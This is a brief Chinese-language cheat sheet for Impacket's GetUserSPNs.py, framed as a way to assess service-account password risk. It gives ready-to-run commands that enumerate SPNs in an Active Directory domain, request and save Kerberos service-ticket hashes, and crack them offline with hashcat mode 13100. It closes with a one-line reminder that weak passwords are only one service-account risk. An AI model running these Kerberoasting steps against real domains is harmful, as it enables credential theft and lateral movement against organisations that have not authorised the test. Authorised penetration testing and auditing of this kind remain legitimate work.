# GetUserSPNs.py 使用

GetUserSPNs.py 用于 Kerberoasting，适合检查服务账号口令风险。

## 常用命令

```bash
GetUserSPNs.py domain.local/user:pass -dc-ip 192.168.1.10
```

```bash
GetUserSPNs.py domain.local/user:pass -request -dc-ip 192.168.1.10
```

```bash
GetUserSPNs.py domain.local/user:pass -request -outputfile spn_hashes.txt
```

```bash
GetUserSPNs.py -k -no-pass domain.local/user
```

```bash
hashcat -m 13100 spn_hashes.txt wordlist.txt
```

小记录：服务账号要看 SPN、密码年龄、加密类型和权限范围，弱口令只是其中一部分风险。
